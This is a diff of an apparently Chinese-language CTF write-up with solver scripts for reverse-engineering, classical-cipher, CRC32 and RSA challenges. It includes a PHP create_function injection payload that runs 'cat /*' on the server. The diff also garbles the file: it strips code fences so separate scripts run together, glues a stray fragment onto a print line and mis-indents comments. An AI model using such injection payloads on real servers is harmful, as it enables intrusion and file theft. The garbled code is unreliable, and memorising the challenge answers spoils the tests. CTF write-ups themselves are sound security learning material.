@@ -210,7 +210,10 @@ REVERSE
 void *Block; // [rsp+20h] [rbp-58h] BYREF
  __int64 v3; // [rsp+28h] [rbp-50h]
 
-Block和v3在栈上是挨着的, 且调用了sub_1400B5650（&unk_1400BB560, &Block）；很明显sub_1400B5650就是读入函数，Block就是std::string，只是IDA把std::string拆成几部分了，v3就是std::string的length成员。也就是说输入的flag是32个字节，显然逻辑是以下伪代码：
+Block和v3在栈上是挨着的, 且调用了sub_1400B5650（&unk_1400BB560, &Block）；很明显sub_1400B5650就是读入函数，Block就是std::
+string，只是IDA把std::
+string拆成几部分了，v3就是std::
+string的length成员。也就是说输入的flag是32个字节，显然逻辑是以下伪代码：
 
 unsigned char bytes_[32] = { 0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda };
 for (int i = 0; i < 32; i++)
@@ -279,11 +282,6 @@ def caesar_decrypt(ciphertext, shift):
 ciphertext = "eccgxj{Nywx_e_W1qtpi_Q13g}"
 shift = 4
 print(caesar_decrypt(ciphertext, shift))
-```
-
-
-
-```
 import zlib
 import itertools
 import string
@@ -314,28 +312,13 @@ if result:
     print(f"CRC32: {hex(zlib.crc32(result.encode()))}")
 else:
     print("No matching string found.")r_decrypt(ciphertext, shift))
-```
-
-
-
-```
 some_encrypt = lambda text, shift: ''.join([chr(((ord(char) - ord('A' if 'A' <= char <= 'Z' else 'a') + shift) % 26) + ord('A' if 'A' <= char <= 'Z' else 'a')) if char.isalpha() else char for char in text])
 
 if __name__ == '__main__':
   plaintext = "Hello, Wordl!"
   shift = 4
   print("Encrypted:", some_encrypt(plaintext, shift))
-```
-
-
-
-```
 ?a=create_function&v=};system('cat /*');/*
-```
-
-
-
-```
 import gmpy2 as gp
 
 e  = 65537
@@ -358,25 +341,20 @@ for x in range(1, e):
   print(m)
   print(hex(m)[2:])
   print(bytes.fromhex(hex(m)[2:]))
-```
-
-
-
-```
 import random
 import string
 dicts = string.ascii_lowercase +"{}"
-#print(dicts)
+    #print(dicts)
 
 key = (''.join([random.choice(dicts) for i in range(4)])) * 8
 enc='tsejk}gbxyiutfchpm}ylm}a}amuxlmg'
 known='ayyctf{'
 
-#print(len(enc))
+    #print(len(enc))
 key=''
 for i in range(4):
     key+=dicts[(ord(enc[i])-ord(known[i]))%28]
-#print(key)
+    #print(key)
 
 key=key*8
 
@@ -393,25 +371,15 @@ for i, letter in enumerate(string.ascii_lowercase):
 index_dict['{'] = 26
 index_dict['}'] = 27
 
-#print(index_dict)
+    #print(index_dict)
 
 flag=''
 for i in range(len(enc)):
     flag+=dicts[(index_dict.get(enc[i])-index_dict.get(key[i]))%28]
 
 print(flag)
-```
-
-
-
-```
 void *Block; // [rsp+20h] [rbp-58h] BYREF
  __int64 v3; // [rsp+28h] [rbp-50h]
-```
-
-
-
-```
 unsigned char bytes_[32] = { 0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda };
 for (int i = 0; i < 32; i++)
 {
@@ -423,11 +391,6 @@ for (int i = 0; i < 32; i++)
   }
 }
 puts("great");
-```
-
-
-
-```
 bytes_ = [0xc5, 0x8f, 0xd9, 0xd8, 0xda, 0xdf, 0x8f, 0xd8, 0x8a, 0x88, 0x8a, 0xdd, 0xc5, 0x8f, 0x8f, 0xd9, 0x8a, 0x8f, 0xda, 0xda, 0xd2, 0x8f, 0xd2, 0xdd, 0x89, 0x8a, 0xde, 0xc5, 0xd9, 0xd8, 0xc5, 0xda]
 
 flag = ""
@@ -436,11 +399,6 @@ for one_byte in bytes_:
   flag += chr(flag_one_char)
 print(flag)
 # 0f4316f3aca80ff4af119f98da504301
-```
-
-
-
-```
 wchar_t edit_input[512] = { 0 }, flag[512] = { 0 };
 GetWindowTextW(Edit的句柄, edit_input, 512);
 sub_403D50(edit_input, output_);
@@ -449,11 +407,6 @@ if (点击次数 >= 5000)
  获取flag函数(flag);
  SetWindowTextW(Edit的句柄, flag);
 }
-```
-
-
-
-```
 if ( v22 )
     result = wcscpy_s(v2, 0x200u, L"wrong flag!");
   else
